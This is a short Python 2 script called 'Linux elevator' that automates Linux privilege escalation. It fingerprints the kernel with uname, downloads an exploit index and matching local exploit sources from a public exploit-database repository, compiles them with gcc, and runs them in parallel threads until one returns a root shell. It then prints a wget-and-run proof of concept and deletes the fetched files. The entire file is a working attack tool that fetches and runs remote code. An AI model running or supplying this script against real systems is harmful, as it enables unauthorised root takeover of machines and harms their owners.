#!/usr/bin/python
import csv
import threading
import urllib

import os

import time

import sys

VERSION = '0.1'
DB = "files.csv"

END = False


def process_exploit(exploit, url_opener):
    filename = exploit['file'][exploit['file'].rindex('/') + 1:]
    files_to_delete = [filename]
    try:
        global END
        exploit_url = "https://raw.githubusercontent.com/offensive-security/exploit-database/master/" + exploit['file']
        url_opener.retrieve(exploit_url, filename)

        if END:
            return
        print 'Running exploit [%s] [%s]' % (filename, exploit['description'])
        if filename.endswith('.c'):
            compile_cmd = 'gcc %s -o %s -lpthread -pthread -lcrypt -lssl -ldl; ' % (filename, filename[:-2])
            run_command(compile_cmd)
            if os.path.exists(filename[:-2]):
                files_to_delete.append(filename[:-2])
                run_exploit(compile_cmd, exploit_url, filename, "./%s" % filename[:-2])
        elif filename.endswith('.py'):
            run_exploit('', exploit_url, filename, "python %s" % filename)
        elif filename.endswith('.pl'):
            run_exploit('', exploit_url, filename, "perl %s" % filename)

    except Exception:
        pass
    for file in files_to_delete:
        run_command('rm %s' % file)


def run_exploit(compile_cmd, exploit_url, filename, exploit_cmd):
    global END
    i, o, e = os.popen3(exploit_cmd, 'r')
    i.write('id\n')
    i.close()
    read = o.read()
    if 'uid=0(root) gid=0(root)' in read:
        print '\nGot root!!\nID: [%s], PoC:\nwget %s --no-check-certificate; %s%s;\n%s' % (filename[:-2], exploit_url, compile_cmd, exploit_cmd, read)
        END = True
        sys.exit()
    o.close()


def run_command(compile_cmd):
    i, o, e = os.popen3(compile_cmd, 'r')
    i.close()
    out = o.read()
    o.close()
    e.close()
    return out


def find_keywords(uname_out):
    tokens = uname_out.split(' ')
    return {'os': tokens[0].lower(), 'version': (tokens[2][:tokens[2].index('.', 2)])}


def run_escalator(ur_lopener=urllib.URLopener()):
    print '\n#### Linux elevator v%s ####\n' % VERSION
    os.chdir('/tmp')
    if not os.path.exists(DB):
        print 'missing DB file, downloading...'
        ur_lopener.retrieve("https://raw.githubusercontent.com/offensive-security/exploit-database/master/files.csv", DB)
    reader = csv.DictReader(open(DB, 'r').readlines(), ['id', 'file', 'description', 'date', 'author', 'platform', 'type', 'port'])

    kernel = find_keywords(os.popen('uname -a', 'r').read())

    print 'Finding exploits for %s kernel %s\n' % (kernel['os'], kernel['version'])
    for row in reader:
        if END:
            os._exit(0)
        if (row['platform'].lower() == kernel['os'] or row['platform'].lower() == 'lin_x86') and row['type'] == 'local' and kernel['version'] in row['description'].lower():
            threading.Thread(target=process_exploit, args=[row, ur_lopener]).start()
            time.sleep(0.8)


if __name__ == "__main__":
    run_escalator()
